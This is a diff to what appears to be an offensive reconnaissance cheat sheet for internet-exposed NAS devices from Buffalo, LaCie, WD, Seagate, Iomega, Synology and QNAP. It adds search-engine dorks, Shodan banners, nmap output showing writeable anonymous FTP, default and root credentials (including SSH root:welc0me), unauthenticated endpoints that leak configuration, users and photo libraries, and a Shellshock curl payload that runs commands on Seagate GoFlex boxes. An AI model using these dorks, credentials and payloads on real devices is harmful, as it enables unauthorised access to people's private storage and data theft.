@@ -1,10 +1,10 @@
-# BUFFALO NAS
+# Buffalo - LinkStation (admin:password)
 intitle:"LinkStation" inurl:"/static/index.html" intext:"BUFFALO INC"
 
 # OpenMediaVault NAS
 intitle:"OpenMediaVault web administration interface" intext:"Login" +"Password"
 
-# WD Cloud
+== Western Digital Technologies Cloud ==
 filetype:cgi inurl:"/cgi-bin/login_mgr.cgi"
 
 # ShareCenter DLink
@@ -18,26 +18,91 @@ inurl:"/info/Japanese/lmclchg/"
 inurl:"/info/Japanese/manual/"
 filetype:html inurl:"/info/Japanese/manual/"
 
-== Synology ==
+== SHODAN ==
 #=================================================
-filetype:cgi AND inurl:((":5000/" OR ":5001/") AND "/webman/index.cgi")
-#=================================================
-[Configuration file disclosure] >> /webman/synodefs.cgi
+AsuStor AS-604T (admin:admin) "Server: lighttpd/1.4.29-devel-162" "5b"
 #=================================================
 
-== LaCie ==
+== LaCie CloudBox ==
 #=================================================
-intitle:"LaCie"+"Login" intext:"Effacer le cache de votre navigateur"
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx  root root Family/ [NSE: writeable]
+#=================================================
+intitle:("LaCie" AND "Login") AND intext:("Effacer le cache de votre navigateur")
+intitle:("LaCie" AND "Login") AND intext:("Clear your browser cache")
+#=================================================
+<title>LaCie | Dashboard</title>
+<a id="id_LaCie" target="_blanck" href= "http://www.lacie.com">LaCie 2014</a>
+<a id="id_LaCie" target="_blanck" href= "http://www.lacie.com">LaCie 2015</a>
 #=================================================
 /api/v2/system/info
 /api/v2/system/general
 /api/v2/system/smtp
 #=================================================
 
-== QNAP TS ==
+== Western Digital Technologies My Book (admin:admin) ==
 #=================================================
-filetype:html intitle:"Welcome to QNAP Turbo NAS" inurl:"/cgi-bin/html/login.html"
-filetype:cgi intitle:"Welcome to QNAP Turbo NAS" inurl:"/cgi-bin/index.cgi"
+Version 01.02.14 with MioNet
+SSH Root access root:welc0me
+#=================================================
+<title>My Book World Edition - WD</title>
+Copyright © 2011 Western Digital Technologies, Inc. All rights reserved.</div>
+#=================================================
+
+== Seagate - GoFlex Home Network Storage System ==
+#=================================================
+Server: Apache/2.2.3 (Red Hat), Set-Cookie: HOMEBASEID=, Location: https://www.seagateshare.com/?hipname=, X-Axentra-Version: 10.2.0
+#=================================================
+[Remote Shell]
+>> curl 'http://[IP]/support/' -H 'User-Agent: () { :; }; pwd;'
+#=================================================
+
+== Iomega StorCenter - EMC Company (ADMIN:ADMIN) ==
+#=================================================
+filetype:html AND inurl:("login" AND "pg" AND "index") AND "Iomega StorCenter"
+#=================================================
+Server: Apache/X.X.XX (Unix) mod_auth_pam/X.X.X DAV/X.X.X mod_ssl/X.X.XX OpenSSL/X.X.XX
+Set-Cookie: iomega=
+#=================================================
+/foldercontent.html
+#=================================================
+
+== Synology Disk Station Manager ==
+#=================================================
+filetype:cgi AND inurl:((":5000/" OR ":5001/") AND "/webman/index.cgi")
+#=================================================
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_ array1/ [NSE: writeable]
+|_ info/
+#=================================================
+[Configuration file disclosure]
+/webapi/entry.cgi?api=SYNO.Core.Desktop.Defs&version=1&method=getjs
+>> "ftpanonymouslogin":"X"
+/webapi/entry.cgi?api=SYNO.Core.Desktop.SessionData&version=1&method=getjs
+#=================================================
+
+== QNAP QTS (admin:admin) ==
+#=================================================
+filetype:html AND intitle:("Welcome to QNAP Turbo NAS") AND inurl:("/cgi-bin/html/login.html")
+filetype:cgi AND intitle:("Welcome to QNAP Turbo NAS") AND inurl:("/cgi-bin/index.cgi")
+#=================================================
+Server: http server
+X-Frame-Options: SAMEORIGIN
+body > /redirect.html?count=
 #=================================================
  modelName > /cgi-bin/authLogin.cgi
+#=================================================
+== Photo Station v5.2.7 ==
+#=================================================
+versions > /photo/api/user.php?json=1
+networks > /photo/p/api/utility.php?a=getInfo&json=1
+#=================================================
+owner > /photo/p/api/list.php?t=albums&json=1
+contents > /photo/p/api/list.php?t=allMedia&a=qsamplealbum&p=1&c=100&s=time&sd=DESC&mt=title&json=1
+#=================================================
+== Photo Station <v5 ==
+#=================================================
+account > /photo/p/api/list.php?t=users
 #=================================================
